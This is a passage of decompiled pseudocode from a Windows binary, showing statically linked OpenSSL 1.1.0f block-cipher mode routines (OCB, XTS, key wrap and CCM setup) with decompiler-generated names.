    goto LABEL_29;
  }
LABEL_28:
  v28 = v36;
LABEL_29:
  if ( v13 < 0x10 )
    memset(&a1[v13], 0, 16 - v13);
  v37((__int64)a1, (__int64)&v38, v28);
  *((_OWORD *)a1 + 1) ^= v38;
  *a1 = v35;
  return 0i64;
}

//----- (0000000140093B60) ----------------------------------------------------
__int64 __fastcall sub_140093B60(_QWORD *a1, int a2, char a3, __int64 a4, __int64 a5)
{
  __int64 result; // rax

  *a1 = 0i64;
  a1[1] = 0i64;
  a1[4] = 0i64;
  result = a5;
  a1[5] = a5;
  *(_BYTE *)a1 = (a3 - 1) & 7 | (8 * (((unsigned int)(a2 - 2) >> 1) & 7));
  a1[6] = a4;
  return result;
}

//----- (0000000140093BA0) ----------------------------------------------------
__int64 __fastcall sub_140093BA0(char *a1, const void *a2, unsigned __int64 a3, __int64 a4)
{
  char v4; // r11
  unsigned int v5; // r10d

  v4 = *a1;
  v5 = *a1 & 7;
  if ( a3 < 14 - v5 )
    return 0xFFFFFFFFi64;
  if ( v5 < 3 )
  {
    *((_QWORD *)a1 + 1) = 0i64;
  }
  else
  {
    a1[8] = HIBYTE(a4);
    a1[9] = BYTE6(a4);
    a1[10] = BYTE5(a4);
    a1[11] = BYTE4(a4);
  }
  a1[15] = a4;
  *a1 = v4 & 0xBF;
  a1[12] = BYTE3(a4);
  a1[13] = BYTE2(a4);
  a1[14] = BYTE1(a4);
  memmove(a1 + 1, a2, 14 - v5);
  return 0i64;
}

//----- (0000000140093C50) ----------------------------------------------------
unsigned __int64 __fastcall sub_140093C50(unsigned __int8 *a1, void *a2, unsigned __int64 a3)
{
  int v3; // eax
  unsigned __int64 v4; // rbx

  v3 = (*a1 >> 3) & 7;
  v4 = (unsigned int)(2 * v3 + 2);
  if ( a3 < v4 )
    return 0i64;
  memmove(a2, a1 + 16, (unsigned int)(2 * v3 + 2));
  return v4;
}

//----- (0000000140093CA0) ----------------------------------------------------
__int64 __fastcall sub_140093CA0(__int64 *a1, __m128i *a2, _QWORD *a3, __int64 a4, unsigned __int64 a5, int a6)
{
  unsigned __int64 v6; // rbx
  __int64 v11; // r8
  unsigned __int64 v12; // r9
  unsigned __int64 v13; // r8
  __int64 v14; // rax
  __int64 v15; // r8
  __m128i v16; // kr00_16
  __int64 v17; // rax
  __int64 v18; // rax
  unsigned int v19; // eax
  __int64 v20; // r8
  __int8 v21; // dl
  __int64 v22; // r8
  __int64 v23; // rax
  unsigned __int64 v24; // rcx
  __int64 v25; // r8
  __int64 v26; // rax
  unsigned int v27; // eax
  __m128i v28; // xmm1
  __int64 v29; // r9
  __int64 v30; // rcx
  __int8 v31; // r8
  __int64 v32; // rdx
  __int64 v33; // r8
  __m128i v34; // [rsp+20h] [rbp-40h] BYREF
  __m128i v35; // [rsp+30h] [rbp-30h] BYREF
  __m128i v36; // [rsp+40h] [rbp-20h] BYREF

  v6 = a5;
  if ( a5 < 0x10 )
    return 0xFFFFFFFFi64;
  v11 = a1[1];
  v35 = *a2;
  ((void (__fastcall *)(__m128i *, __m128i *, __int64))a1[3])(&v35, &v35, v11);
  if ( !a6 && (a5 & 0xF) != 0 )
    v6 = a5 - 16;
  v12 = v35.m128i_u64[1];
  v13 = v35.m128i_i64[0];
  if ( v6 < 0x10 )
  {
LABEL_9:
    if ( a6 )
    {
      v19 = 0;
      if ( v6 )
      {
        v20 = 0i64;
        do
        {
          v21 = *((_BYTE *)a3 + v20);
          ++v19;
          *(_BYTE *)(v20 + a4) = v34.m128i_i8[v20];
          v34.m128i_i8[v20] = v21;
          v20 = v19;
        }
        while ( v19 < v6 );
      }
      v22 = *a1;
      v34 = _mm_xor_si128(_mm_loadu_si128(&v35), _mm_loadu_si128(&v34));
      ((void (__fastcall *)(__m128i *, __m128i *, __int64, unsigned __int64))a1[2])(&v34, &v34, v22, v12);
      *(__m128i *)(a4 - 16) = _mm_xor_si128(_mm_loadu_si128(&v35), _mm_loadu_si128(&v34));
    }
    else
    {
      v23 = 2 * v13;
      v24 = v13 >> 63;
      v25 = *a1;
      v36.m128i_i64[0] = v23 ^ (v35.m128i_i32[3] >> 31) & 0x87;
      v26 = v36.m128i_i64[0] ^ *a3;
      v36.m128i_i64[1] = (2 * v12) | v24;
      v34.m128i_i64[0] = v26;
      v34.m128i_i64[1] = v36.m128i_i64[1] ^ a3[1];
      ((void (__fastcall *)(__m128i *, __m128i *, __int64))a1[2])(&v34, &v34, v25);
      v27 = 0;
      v28 = _mm_xor_si128(_mm_loadu_si128(&v36), _mm_loadu_si128(&v34));
      v34 = v28;
      if ( v6 )
      {
        v29 = 0i64;
        do
        {
          v30 = v27 + 16;
          ++v27;
          v31 = *((_BYTE *)a3 + v30);
          v32 = (unsigned int)v30;
          LOBYTE(v30) = v34.m128i_i8[v29];
          v34.m128i_i8[v29] = v31;
          v29 = v27;
          *(_BYTE *)(v32 + a4) = v30;
        }
        while ( v27 < v6 );
        v28 = _mm_loadu_si128(&v34);
      }
      v33 = *a1;
      v34 = _mm_xor_si128(_mm_loadu_si128(&v35), v28);
      ((void (__fastcall *)(__m128i *, __m128i *, __int64))a1[2])(&v34, &v34, v33);
      *(_OWORD *)a4 = *(_OWORD *)&v34 ^ *(_OWORD *)&v35;
    }
  }
  else
  {
    while ( 1 )
    {
      v14 = v13 ^ *a3;
      v15 = *a1;
      v34.m128i_i64[0] = v14;
      v34.m128i_i64[1] = v12 ^ a3[1];
      ((void (__fastcall *)(__m128i *, __m128i *, __int64))a1[2])(&v34, &v34, v15);
      a3 += 2;
      v16 = v35;
      v17 = v35.m128i_i64[0] ^ v34.m128i_i64[0];
      *(_QWORD *)a4 = v35.m128i_i64[0] ^ v34.m128i_i64[0];
      v34.m128i_i64[0] = v17;
      v18 = v16.m128i_i64[1] ^ v34.m128i_i64[1];
      *(_QWORD *)(a4 + 8) = v16.m128i_i64[1] ^ v34.m128i_i64[1];
      a4 += 16i64;
      v34.m128i_i64[1] = v18;
      v6 -= 16i64;
      if ( !v6 )
        break;
      v13 = (2 * v16.m128i_i64[0]) ^ (v35.m128i_i32[3] >> 31) & 0x87;
      v12 = ((unsigned __int64)v16.m128i_i64[0] >> 63) | (2 * v16.m128i_i64[1]);
      v35.m128i_i64[0] = v13;
      v35.m128i_i64[1] = v12;
      if ( v6 < 0x10 )
        goto LABEL_9;
    }
  }
  return 0i64;
}

//----- (0000000140093F00) ----------------------------------------------------
__int64 __fastcall sub_140093F00(
        __int64 a1,
        void *a2,
        char *a3,
        __int64 *a4,
        __int64 a5,
        void (__fastcall *a6)(__int64 *, __int64 *, __int64))
{
  __int64 v8; // rbx
  void *v9; // rdx
  __int64 v11; // [rsp+30h] [rbp-28h] BYREF

  v8 = sub_1400943C0(a1, &v11, a3, a4, a5, a6);
  if ( !v8 )
    return 0i64;
  v9 = &unk_1401182C0;
  if ( a2 )
    v9 = a2;
  if ( (unsigned int)sub_140023460((char *)&v11, (__int64)v9, 8i64) )
  {
    sub_140023440((__int64)a3, v8);
    return 0i64;
  }
  return v8;
}

//----- (0000000140093FA0) ----------------------------------------------------
unsigned __int64 __fastcall sub_140093FA0(
        __int64 a1,
        int *a2,
        __int64 *a3,
        const void *a4,
        size_t Size,
        void (__fastcall *a6)(__int64 *, __int64 *, __int64))
{
  size_t v7; // r12
  __int64 v10; // rbp
  int *v11; // rdx
  unsigned __int64 v12; // rbx
  __int64 v14; // [rsp+30h] [rbp-48h] BYREF

  v7 = Size >> 3;
  if ( (Size & 7) != 0 || Size - 16 > 0x7FFFFFEF )
    return 0i64;
  memmove(a3, a4, Size);
  if ( Size == 16 )
  {
    a6(a3, a3, a1);
    v10 = 8i64;
    v14 = *a3;
    memmove(a3, a3 + 1, 8ui64);
  }
  else
  {
    v10 = Size - 8;
    if ( Size - 8 != sub_1400943C0(a1, &v14, (char *)a3, a3, Size, a6) )
    {
LABEL_14:
      sub_140023440((__int64)a3, Size);
      return 0i64;
    }
  }
  v11 = &dword_1401182C8;
  if ( a2 )
    v11 = a2;
  if ( (unsigned int)sub_140023460((char *)&v14, (__int64)v11, 4i64) )
    goto LABEL_14;
  v12 = HIBYTE(v14) | ((BYTE6(v14) | ((BYTE5(v14) | ((unsigned __int64)BYTE4(v14) << 8)) << 8)) << 8);
  if ( 8 * v7 - 16 >= v12
    || v12 > 8 * v7 - 8
    || (unsigned int)sub_140023460((char *)a3 + v12, (__int64)&unk_140143430, v10 - v12) )
  {
    goto LABEL_14;
  }
  return v12;
}
// 1401182C8: using guessed type int dword_1401182C8;

//----- (0000000140094120) ----------------------------------------------------
__int64 __fastcall sub_140094120(
        __int64 a1,
        __int64 *a2,
        _QWORD *a3,
        const void *a4,
        size_t Size,
        void (__fastcall *a6)(__int64 *, __int64 *, __int64))
{
  unsigned __int64 v8; // rbx
  __int64 *v9; // r13
  __int64 *v10; // rax
  __int64 v11; // r12
  __int64 *v12; // rdi
  size_t v13; // rsi
  __int64 v16; // [rsp+28h] [rbp-50h] BYREF
  __int64 v17; // [rsp+30h] [rbp-48h]

  if ( (Size & 7) != 0 || Size - 16 > 0x7FFFFFF0 )
    return 0i64;
  v8 = 1i64;
  v9 = a3 + 1;
  memmove(a3 + 1, a4, Size);
  v10 = (__int64 *)&unk_1401182C0;
  v11 = 6i64;
  if ( a2 )
    v10 = a2;
  v16 = *v10;
  do
  {
    v12 = v9;
    if ( Size )
    {
      v13 = ((Size - 1) >> 3) + 1;
      do
      {
        v17 = *v12;
        a6(&v16, &v16, a1);
        HIBYTE(v16) ^= v8;
        if ( v8 > 0xFF )
        {
          BYTE6(v16) ^= BYTE1(v8);
          BYTE5(v16) ^= BYTE2(v8);
          BYTE4(v16) ^= BYTE3(v8);
        }
        ++v8;
        *v12++ = v17;
        --v13;
      }
      while ( v13 );
    }
    --v11;
  }
  while ( v11 );
  *a3 = v16;
  return Size + 8;
}

//----- (0000000140094290) ----------------------------------------------------
__int64 __fastcall sub_140094290(
        __int64 a1,
        int *a2,
        __int64 *a3,
        const void *a4,
        size_t Size,
        void (__fastcall *a6)(__int64 *, __int64 *, __int64))
{
  size_t v8; // rsi
  size_t v9; // rbp
  int v10; // eax
  int v12[2]; // [rsp+30h] [rbp-48h] BYREF

  v8 = (Size + 7) & 0xFFFFFFFFFFFFFFF8ui64;
  v9 = v8 - Size;
  if ( Size - 1 > 0x7FFFFFFE )
    return 0i64;
  v10 = -1504093786;
  if ( a2 )
    v10 = *a2;
  v12[0] = v10;
  HIBYTE(v12[1]) = Size;
  LOBYTE(v12[1]) = BYTE3(Size);
  BYTE1(v12[1]) = BYTE2(Size);
  BYTE2(v12[1]) = BYTE1(Size);
  if ( v8 == 8 )
  {
    memmove(a3 + 1, a4, Size);
    *a3 = *(_QWORD *)v12;
    memset((char *)a3 + Size + 8, 0, v9);
    a6(a3, a3, a1);
    return 16i64;
  }
  else
  {
    memmove(a3, a4, Size);
    memset((char *)a3 + Size, 0, v9);
    return (int)sub_140094120(a1, (__int64 *)v12, a3, a3, v8, a6);
  }
}
// 1401182C8: using guessed type int dword_1401182C8;

//----- (00000001400943C0) ----------------------------------------------------
__int64 __fastcall sub_1400943C0(
        __int64 a1,
        _QWORD *a2,
        char *a3,
        __int64 *a4,
        __int64 a5,
        void (__fastcall *a6)(__int64 *, __int64 *, __int64))
{
  unsigned __int64 v7; // rbp
  unsigned __int64 v9; // rbx
  char *v10; // r13
  __int64 v11; // r12
  __int64 *v12; // rdi
  unsigned __int64 v13; // rsi
  __int64 v16; // [rsp+28h] [rbp-60h] BYREF
  __int64 v17; // [rsp+30h] [rbp-58h]

  v7 = a5 - 8;
  if ( (((_BYTE)a5 - 8) & 7) != 0 || (unsigned __int64)(a5 - 24) > 0x7FFFFFF0 )
    return 0i64;
  v9 = 6 * (v7 >> 3);
  v16 = *a4;
  memmove(a3, a4 + 1, a5 - 8);
  v10 = a3 - 8;
  v11 = 6i64;
  do
  {
    v12 = (__int64 *)&v10[v7];
    if ( a5 != 8 )
    {
      v13 = ((unsigned __int64)(a5 - 9) >> 3) + 1;
      do
      {
        HIBYTE(v16) ^= v9;
        if ( v9 > 0xFF )
        {
          BYTE6(v16) ^= BYTE1(v9);
          BYTE5(v16) ^= BYTE2(v9);
          BYTE4(v16) ^= BYTE3(v9);
        }
        v17 = *v12;
        a6(&v16, &v16, a1);
        --v9;
        *v12-- = v17;
        --v13;
      }
      while ( v13 );
    }
    --v11;
  }
  while ( v11 );
  *a2 = v16;
  return a5 - 8;
}

//----- (0000000140094530) ----------------------------------------------------
__int64 __fastcall sub_140094530(
        void (__fastcall **a1)(__int64 *, __int64 *, __int64),
        __int64 a2,
        unsigned __int64 a3)
{
  void (__fastcall *v3)(__int64 *, __int64 *, __int64); // rax
  unsigned __int64 v4; // rsi
  char v5; // bp
  unsigned __int64 v8; // rbx
  unsigned __int64 v9; // r14
  unsigned int v10; // ecx
  unsigned __int64 i; // rax
  __int64 result; // rax
  void (__fastcall *v13)(__int64 *, __int64 *, __int64); // r8
  __int64 v14; // rcx
  unsigned int v15; // ebp
  void (__fastcall *v16)(__int64 *, __int64 *, __int64); // rbx
  void (__fastcall *v17)(__int64 *, __int64 *, __int64); // rax
  void (__fastcall *v18)(__int64 *, __int64 *, __int64); // r8
  unsigned __int64 v19; // [rsp+20h] [rbp-58h] BYREF
  unsigned __int64 v20; // [rsp+28h] [rbp-50h]
  unsigned __int64 v21; // [rsp+30h] [rbp-48h] BYREF
  unsigned __int64 v22; // [rsp+38h] [rbp-40h]

  v3 = a1[12];
  v4 = a3 >> 4;
  v5 = a3;
  v8 = (unsigned __int64)v3 + 1;
  v9 = (unsigned __int64)v3 + (a3 >> 4);
  if ( (unsigned __int64)v3 + 1 > v9 )
  {
LABEL_6:
    v15 = v5 & 0xF;
    if ( v15 )
    {
      a1[16] = (void (__fastcall *)(__int64 *, __int64 *, __int64))((unsigned __int64)a1[7] ^ (unsigned __int64)a1[16]);
      a1[17] = (void (__fastcall *)(__int64 *, __int64 *, __int64))((unsigned __int64)a1[8] ^ (unsigned __int64)a1[17]);
      v16 = a1[17];
      v19 = 0i64;
      v20 = 0i64;
      memmove(&v19, (const void *)(a2 + 16 * v4), v15);
      v17 = a1[16];
      v18 = a1[2];
      *((_BYTE *)&v19 + v15) = 0x80;
      v21 = v19 ^ (unsigned __int64)v17;
      v22 = v20 ^ (unsigned __int64)v16;
      (*a1)((__int64 *)&v21, (__int64 *)&v19, (__int64)v18);
      a1[18] = (void (__fastcall *)(__int64 *, __int64 *, __int64))(v19 ^ (unsigned __int64)a1[18]);
      a1[19] = (void (__fastcall *)(__int64 *, __int64 *, __int64))(v20 ^ (unsigned __int64)a1[19]);
    }
    a1[12] = (void (__fastcall *)(__int64 *, __int64 *, __int64))v9;
    return 1i64;
  }
  else
  {
    while ( 1 )
    {
      v10 = 0;
      for ( i = v8; (i & 1) == 0; ++v10 )
        i >>= 1;
      result = (__int64)sub_140095350(a1, v10);
      if ( !result )
        break;
      a1[16] = (void (__fastcall *)(__int64 *, __int64 *, __int64))(*(_QWORD *)result ^ (unsigned __int64)a1[16]);
      a1[17] = (void (__fastcall *)(__int64 *, __int64 *, __int64))(*(_QWORD *)(result + 8) ^ (unsigned __int64)a1[17]);
      v13 = a1[2];
      v14 = 2 * (v8 - (_QWORD)a1[12] - 1);
      v19 = *(_QWORD *)(a2 + 16 * (v8 - (_QWORD)a1[12] - 1)) ^ (unsigned __int64)a1[16];
      v20 = (unsigned __int64)a1[17] ^ *(_QWORD *)(a2 + 8 * v14 + 8);
      (*a1)((__int64 *)&v19, (__int64 *)&v21, (__int64)v13);
      ++v8;
      a1[18] = (void (__fastcall *)(__int64 *, __int64 *, __int64))(v21 ^ (unsigned __int64)a1[18]);
      a1[19] = (void (__fastcall *)(__int64 *, __int64 *, __int64))(v22 ^ (unsigned __int64)a1[19]);
      if ( v8 > v9 )
        goto LABEL_6;
    }
  }
  return result;
}

//----- (00000001400946E0) ----------------------------------------------------
__int64 __fastcall sub_1400946E0(__int64 a1)
{
  __int64 result; // rax

  if ( a1 )
  {
    sub_14001DA40(
      *(void **)(a1 + 88),
      16i64 * *(_QWORD *)(a1 + 48),
      (__int64)"..\\..\\openssl-1.1.0f\\crypto\\modes\\ocb128.c",
      0x233u);
    return sub_140023440(a1, 192i64);
  }
  return result;
}

//----- (0000000140094730) ----------------------------------------------------
__int64 __fastcall sub_140094730(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 result; // rax

  *(_OWORD *)a1 = *(_OWORD *)a2;
  *(_OWORD *)(a1 + 16) = *(_OWORD *)(a2 + 16);
  *(_OWORD *)(a1 + 32) = *(_OWORD *)(a2 + 32);
  *(_OWORD *)(a1 + 48) = *(_OWORD *)(a2 + 48);
  *(_OWORD *)(a1 + 64) = *(_OWORD *)(a2 + 64);
  *(_OWORD *)(a1 + 80) = *(_OWORD *)(a2 + 80);
  *(_OWORD *)(a1 + 96) = *(_OWORD *)(a2 + 96);
  *(_OWORD *)(a1 + 112) = *(_OWORD *)(a2 + 112);
  *(_OWORD *)(a1 + 128) = *(_OWORD *)(a2 + 128);
  *(_OWORD *)(a1 + 144) = *(_OWORD *)(a2 + 144);
  *(_OWORD *)(a1 + 160) = *(_OWORD *)(a2 + 160);
  *(_OWORD *)(a1 + 176) = *(_OWORD *)(a2 + 176);
  if ( a3 )
    *(_QWORD *)(a1 + 16) = a3;
  if ( a4 )
    *(_QWORD *)(a1 + 24) = a4;
  if ( *(_QWORD *)(a2 + 88) )
  {
    result = (__int64)sub_14001D8E0(16i64 * *(_QWORD *)(a2 + 48));
    *(_QWORD *)(a1 + 88) = result;
    if ( !result )
      return result;
    memmove((void *)result, *(const void **)(a2 + 88), 16 * (*(_QWORD *)(a2 + 40) + 1i64));
  }
  return 1i64;
}

//----- (0000000140094830) ----------------------------------------------------
__int64 __fastcall sub_140094830(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4)
{
  __int64 v4; // rsi
  unsigned __int64 v5; // r14
  char v6; // r15
  unsigned __int64 v10; // rbp
  unsigned __int64 v11; // rbx
  unsigned __int64 i; // rax
  unsigned __int64 j; // rsi
  unsigned __int64 v15; // rax
  unsigned int k; // ecx
  _QWORD *v17; // rax
  __int64 v18; // r8
  __int64 v19; // rcx
  unsigned __int64 v20; // rcx
  __int64 *v21; // rcx
  unsigned int v22; // r15d
  __int64 v23; // r14
  __int64 v24; // [rsp+40h] [rbp-88h] BYREF
  __int64 v25; // [rsp+48h] [rbp-80h]
  __int64 v26[2]; // [rsp+50h] [rbp-78h] BYREF
  __m128i v27; // [rsp+60h] [rbp-68h] BYREF

  v4 = *(_QWORD *)(a1 + 104);
  v5 = a4 >> 4;
  v6 = a4;
  v10 = v4 + (a4 >> 4);
  if ( a4 >> 4 && *(_QWORD *)(a1 + 32) )
  {
    v11 = 0i64;
    for ( i = v10 >> 1; i; i >>= 1 )
      ++v11;
    if ( !sub_140095350((_QWORD *)a1, v11) )
      return 0i64;
    (*(void (__fastcall **)(__int64, __int64, unsigned __int64, _QWORD, __int64, __int64, _QWORD, __int64))(a1 + 32))(
      a2,
      a3,
      v5,
      *(_QWORD *)(a1 + 24),
      *(_QWORD *)(a1 + 104) + 1i64,
      a1 + 160,
      *(_QWORD *)(a1 + 88),
      a1 + 176);
  }
  else
  {
    for ( j = v4 + 1; j <= v10; *(_QWORD *)(a1 + 184) ^= v21[1] )
    {
      v15 = j;
      for ( k = 0; (v15 & 1) == 0; ++k )
        v15 >>= 1;
      v17 = sub_140095350((_QWORD *)a1, k);
      if ( !v17 )
        return 0i64;
      *(_QWORD *)(a1 + 160) ^= *v17;
      *(_QWORD *)(a1 + 168) ^= v17[1];
      v18 = *(_QWORD *)(a1 + 24);
      v19 = 2 * (j - *(_QWORD *)(a1 + 104) - 1);
      v24 = *(_QWORD *)(a2 + 16 * (j - *(_QWORD *)(a1 + 104) - 1)) ^ *(_QWORD *)(a1 + 160);
      v25 = *(_QWORD *)(a1 + 168) ^ *(_QWORD *)(a2 + 8 * v19 + 8);
      (*(void (__fastcall **)(__int64 *, __int64 *, __int64))(a1 + 8))(&v24, v26, v18);
      v20 = j - *(_QWORD *)(a1 + 104);
      ++j;
      v21 = (__int64 *)(a3 + 16 * (v20 - 1));
      *v21 = v26[0] ^ *(_QWORD *)(a1 + 160);
      v21[1] = v26[1] ^ *(_QWORD *)(a1 + 168);
      *(_QWORD *)(a1 + 176) ^= *v21;
    }
  }
  v22 = v6 & 0xF;
  if ( v22 )
  {
    *(_QWORD *)(a1 + 160) ^= *(_QWORD *)(a1 + 56);
    *(_QWORD *)(a1 + 168) ^= *(_QWORD *)(a1 + 64);
    (*(void (__fastcall **)(__int64, __m128i *, _QWORD))a1)(a1 + 160, &v27, *(_QWORD *)(a1 + 16));
    v23 = 2 * v5;
    sub_140095260(a2 + 8 * v23, &v27, v22, a3 + 8 * v23);
    v24 = 0i64;
    v25 = 0i64;
    memmove(&v24, (const void *)(a3 + 8 * v23), v22);
    *((_BYTE *)&v24 + v22) = 0x80;
    *(_QWORD *)(a1 + 176) ^= v24;
    *(_QWORD *)(a1 + 184) ^= v25;
  }
  *(_QWORD *)(a1 + 104) = v10;
  return 1i64;
}

//----- (0000000140094A90) ----------------------------------------------------
__int64 __fastcall sub_140094A90(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4)
{
  __int64 v4; // rsi
  unsigned __int64 v5; // r14
  char v6; // r15
  unsigned __int64 v10; // rbp
  unsigned __int64 v11; // rbx
  unsigned __int64 i; // rax
  unsigned __int64 j; // rsi
  unsigned __int64 v15; // rax
  unsigned int k; // ecx
  _QWORD *v17; // rax
  _QWORD *v18; // rcx
  unsigned __int64 v19; // rcx
  __int64 v20; // rcx
  unsigned int v21; // r15d
  __int64 v22; // r14
  __int64 v23; // [rsp+40h] [rbp-88h] BYREF
  __int64 v24; // [rsp+48h] [rbp-80h]
  __int64 v25[2]; // [rsp+50h] [rbp-78h] BYREF
  __m128i v26; // [rsp+60h] [rbp-68h] BYREF

  v4 = *(_QWORD *)(a1 + 104);
  v5 = a4 >> 4;
  v6 = a4;
  v10 = v4 + (a4 >> 4);
  if ( a4 >> 4 && *(_QWORD *)(a1 + 32) )
  {
    v11 = 0i64;
    for ( i = v10 >> 1; i; i >>= 1 )
      ++v11;
    if ( !sub_140095350((_QWORD *)a1, v11) )
      return 0i64;
    (*(void (__fastcall **)(__int64, __int64, unsigned __int64, _QWORD, __int64, __int64, _QWORD, __int64))(a1 + 32))(
      a2,
      a3,
      v5,
      *(_QWORD *)(a1 + 16),
      *(_QWORD *)(a1 + 104) + 1i64,
      a1 + 160,
      *(_QWORD *)(a1 + 88),
      a1 + 176);
  }
  else
  {
    for ( j = v4 + 1; j <= v10; *(_QWORD *)(a3 + 8 * v20 + 8) = v25[1] ^ *(_QWORD *)(a1 + 168) )
    {
      v15 = j;
      for ( k = 0; (v15 & 1) == 0; ++k )
        v15 >>= 1;
      v17 = sub_140095350((_QWORD *)a1, k);
      if ( !v17 )
        return 0i64;
      *(_QWORD *)(a1 + 160) ^= *v17;
      *(_QWORD *)(a1 + 168) ^= v17[1];
      v18 = (_QWORD *)(a2 + 16 * (j - *(_QWORD *)(a1 + 104) - 1));
      v23 = *v18 ^ *(_QWORD *)(a1 + 160);
      v24 = *(_QWORD *)(a1 + 168) ^ v18[1];
      *(_QWORD *)(a1 + 176) ^= *v18;
      *(_QWORD *)(a1 + 184) ^= v18[1];
      (*(void (__fastcall **)(__int64 *, __int64 *, _QWORD))a1)(&v23, v25, *(_QWORD *)(a1 + 16));
      v19 = j - *(_QWORD *)(a1 + 104);
      ++j;
      v20 = 2 * (v19 - 1);
      *(_QWORD *)(a3 + 8 * v20) = v25[0] ^ *(_QWORD *)(a1 + 160);
    }
  }
  v21 = v6 & 0xF;
  if ( v21 )
  {
    *(_QWORD *)(a1 + 160) ^= *(_QWORD *)(a1 + 56);
    *(_QWORD *)(a1 + 168) ^= *(_QWORD *)(a1 + 64);
    (*(void (__fastcall **)(__int64, __m128i *, _QWORD))a1)(a1 + 160, &v26, *(_QWORD *)(a1 + 16));
    v22 = 2 * v5;
    sub_140095260(a2 + 8 * v22, &v26, v21, a3 + 8 * v22);
    v23 = 0i64;
    v24 = 0i64;
    memmove(&v23, (const void *)(a2 + 8 * v22), v21);
    *((_BYTE *)&v23 + v21) = 0x80;
    *(_QWORD *)(a1 + 176) ^= v23;
    *(_QWORD *)(a1 + 184) ^= v24;
  }
  *(_QWORD *)(a1 + 104) = v10;
  return 1i64;
}

//----- (0000000140094CF0) ----------------------------------------------------
__int64 __fastcall sub_140094CF0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v5; // r8
  __int64 v7; // rdx
  __int64 v8; // rax
  __int64 v9; // r8
  __int64 v11; // [rsp+20h] [rbp-48h] BYREF
  __int64 v12; // [rsp+28h] [rbp-40h]
  __int64 v13[2]; // [rsp+30h] [rbp-38h] BYREF

  v5 = *(_QWORD *)(a1 + 160) ^ *(_QWORD *)(a1 + 176);
  v7 = *(_QWORD *)(a1 + 168) ^ *(_QWORD *)(a1 + 184);
  v13[0] = v5 ^ *(_QWORD *)(a1 + 72);
  v8 = v7 ^ *(_QWORD *)(a1 + 80);
  v11 = v5;
  v9 = *(_QWORD *)(a1 + 16);
  v12 = v7;
  v13[1] = v8;
  (*(void (__fastcall **)(__int64 *, __int64 *, __int64))a1)(v13, &v11, v9);
  *(_QWORD *)(a1 + 112) = v11 ^ *(_QWORD *)(a1 + 144);
  *(_QWORD *)(a1 + 120) = v12 ^ *(_QWORD *)(a1 + 152);
  if ( (unsigned __int64)(a3 - 1) <= 0xF && a2 )
    return sub_140023460((char *)(a1 + 112), a2, a3);
  else
    return 0xFFFFFFFFi64;
}

//----- (0000000140094DC0) ----------------------------------------------------
__int64 __fastcall sub_140094DC0(
        _QWORD *a1,
        __int64 a2,
        __int64 a3,
        void (__fastcall *a4)(_QWORD *, _QWORD *, __int64),
        __int64 a5,
        __int64 a6)
{
  __int64 result; // rax
  char v11; // bl
  __int64 v12; // rdi
  char v13; // bl
  _BYTE *v14; // rcx
  _BYTE *v15; // rdi
  char v16; // bl
  __int64 v17; // rax
  __int64 v18; // rdi
  char v19; // bl
  __int64 v20; // rax
  __int64 v21; // rdi
  char v22; // bl
  __int64 v23; // rcx
  __int64 v24; // rdi
  char v25; // bl

  memset(a1, 0, 0xC0ui64);
  a1[5] = 0i64;
  a1[6] = 5i64;
  result = (__int64)sub_14001D8E0(0x50ui64);
  a1[11] = result;
  if ( result )
  {
    a1[1] = a5;
    a1[4] = a6;
    *a1 = a4;
    a1[2] = a2;
    a1[3] = a3;
    a4(a1 + 7, a1 + 7, a2);
    v11 = -121 * (*((_BYTE *)a1 + 56) >> 7);
    sub_1400951B0((__int64)(a1 + 7), 1, (__int64)(a1 + 9));
    *((_BYTE *)a1 + 87) ^= v11;
    v12 = a1[11];
    v13 = -121 * (*((_BYTE *)a1 + 72) >> 7);
    sub_1400951B0((__int64)(a1 + 9), 1, v12);
    *(_BYTE *)(v12 + 15) ^= v13;
    v14 = (_BYTE *)a1[11];
    v15 = v14 + 16;
    v16 = -121 * (*v14 >> 7);
    sub_1400951B0((__int64)v14, 1, (__int64)(v14 + 16));
    v15[15] ^= v16;
    v17 = a1[11];
    v18 = v17 + 32;
    v19 = -121 * (*(_BYTE *)(v17 + 16) >> 7);
    sub_1400951B0(v17 + 16, 1, v17 + 32);
    *(_BYTE *)(v18 + 15) ^= v19;
    v20 = a1[11];
    v21 = v20 + 48;
    v22 = -121 * (*(_BYTE *)(v20 + 32) >> 7);
    sub_1400951B0(v20 + 32, 1, v20 + 48);
    *(_BYTE *)(v21 + 15) ^= v22;
    v23 = a1[11];
    v24 = v23 + 64;
    v25 = -121 * (*(_BYTE *)(v23 + 48) >> 7);
    sub_1400951B0(v23 + 48, 1, v23 + 64);
    *(_BYTE *)(v24 + 15) ^= v25;
    result = 1i64;
    a1[5] = 4i64;
  }
  return result;
}

//----- (0000000140094F70) ----------------------------------------------------
__int64 __fastcall sub_140094F70(__int64 a1, const void *a2, size_t a3, __int64 a4)
{
  __int64 v6; // r8
  char v7; // cl
  char v8; // bl
  unsigned __int64 v9; // rdi
  char v10; // dl
  char v11; // al
  char v12; // cl
  char v13; // al
  char v14; // dl
  char v15; // al
  char v16; // cl
  char v17; // al
  char v18; // dl
  char v19; // al
  char v20; // cl
  __int64 result; // rax
  __m128i v22; // [rsp+20h] [rbp-60h]
  __m128i v23; // [rsp+30h] [rbp-50h] BYREF
  char v24[16]; // [rsp+40h] [rbp-40h]
  __m128i v25; // [rsp+50h] [rbp-30h] BYREF
  __m128i v26; // [rsp+60h] [rbp-20h] BYREF

  if ( a3 - 1 > 0xE || (unsigned __int64)(a4 - 1) > 0xF )
    return 0xFFFFFFFFi64;
  v22.m128i_i8[0] = 16 * a4;
  *(__int64 *)((char *)v22.m128i_i64 + 1) = 0i64;
  *(__int32 *)((char *)&v22.m128i_i32[2] + 1) = 0;
  *(__int16 *)((char *)&v22.m128i_i16[6] + 1) = 0;
  v22.m128i_i8[15] = 0;
  memmove((char *)&v23 - a3, a2, a3);
  v6 = *(_QWORD *)(a1 + 16);
  v22.m128i_i8[-a3 + 15] |= 1u;
  v25 = v22;
  v25.m128i_i8[15] = HIBYTE(_mm_srli_si128(v22, 8).m128i_u64[0]) & 0xC0;
  (*(void (__fastcall **)(__m128i *, __m128i *, __int64))a1)(&v25, &v26, v6);
  v7 = _mm_cvtsi128_si32(_mm_srli_si128(v26, 1));
  v8 = v22.m128i_i8[15] & 7;
  v9 = (unsigned __int64)(v22.m128i_i8[15] & 0x3F) >> 3;
  v10 = _mm_cvtsi128_si32(_mm_srli_si128(v26, 2));
